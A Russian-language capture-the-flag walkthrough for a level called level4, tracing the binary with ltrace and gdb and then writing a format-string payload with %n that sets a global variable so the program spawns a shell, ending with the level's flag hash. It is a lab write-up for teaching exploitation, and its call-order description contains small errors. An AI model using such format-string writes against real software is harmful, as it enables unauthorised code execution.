1) попробуем ltrace ltrace ./level4
	__libc_start_main(0x80484a7, 1, 0xbffff7b4, 0x80484c0, 0x8048530 <unfinished ...>
	fgets(test
	"test\n", 512, 0xb7fd1ac0)                                                       = 0xbffff500
	printf("test\n"test
	)                                                                       = 5
	+++ exited (status 0) +++
	Как и в прошлом задании вызывается printf
2) посмотрим глобальные переменнные
	gdb ./level4
	i var

	...
	0x08049810  m
	...
	Нашли глобальную переменную 'm' как и в предыдущем задании
	Посмотрим функции
	i func

	....
	0x08048444  p
	0x08048457  n
	0x080484a7  main
	...

	disas p
	disas n
	disas main

	(gdb) disas p
	0x08048444 <+0>:	push   %ebp
	0x08048445 <+1>:	mov    %esp,%ebp
	0x08048447 <+3>:	sub    $0x18,%esp
	0x0804844a <+6>:	mov    0x8(%ebp),%eax
	0x0804844d <+9>:	mov    %eax,(%esp)
	0x08048450 <+12>:	call   0x8048340 <printf@plt>
	0x08048455 <+17>:	leave
	0x08048456 <+18>:	ret

	(gdb) disas n
	0x08048457 <+0>:	push   %ebp
	0x08048458 <+1>:	mov    %esp,%ebp
	0x0804845a <+3>:	sub    $0x218,%esp
	0x08048460 <+9>:	mov    0x8049804,%eax
	0x08048465 <+14>:	mov    %eax,0x8(%esp)
	0x08048469 <+18>:	movl   $0x200,0x4(%esp)
	0x08048471 <+26>:	lea    -0x208(%ebp),%eax
	0x08048477 <+32>:	mov    %eax,(%esp)
	0x0804847a <+35>:	call   0x8048350 <fgets@plt>
	0x0804847f <+40>:	lea    -0x208(%ebp),%eax
	0x08048485 <+46>:	mov    %eax,(%esp)
	0x08048488 <+49>:	call   0x8048444 <p>
	0x0804848d <+54>:	mov    0x8049810,%eax				#'m' в eax
	0x08048492 <+59>:	cmp    $0x1025544,%eax				#if eax != 16930116
	0x08048497 <+64>:	jne    0x80484a5 <n+78>				#jump
	0x08048499 <+66>:	movl   $0x8048590,(%esp)
	0x080484a0 <+73>:	call   0x8048360 <system@plt>
	0x080484a5 <+78>:	leave
	0x080484a6 <+79>:	ret

	(gdb) disas main
	0x080484a7 <+0>:	push   %ebp
	0x080484a8 <+1>:	mov    %esp,%ebp
	0x080484aa <+3>:	and    $0xfffffff0,%esp
	0x080484ad <+6>:	call   0x8048457 <n>
	0x080484b2 <+11>:	leave
	0x080484b3 <+12>:	ret

2) Видим, что в main вызывается p, в p вызывается n nотом shell

3)проанализируем адрес входного аргумента в printf
	./level4
	1111 0xb7ff26b0 0xbffff754 0xb7fd0ff4 (nil) (nil) 0xbffff718 0x804848d 0xbffff510 0x200 0xb7fd1ac0 0xb7ff37d0 0x31313131 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520

	Видим, что 12 аргумент 0x31313131 - наш 1111

4) запустим скрипт echo -e "\x10\x98\x04\x08%16930112d%12\$n" > /tmp/lvl4

	\x10\x98\x04\x08 - адрес глобальной переменной main
	16930112d - 16930112 пробелов (16930116 - 4)
	12\$n - 12 аргумент по счету

5) cat /tmp/lvl4 - | ./level4
	....
	0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
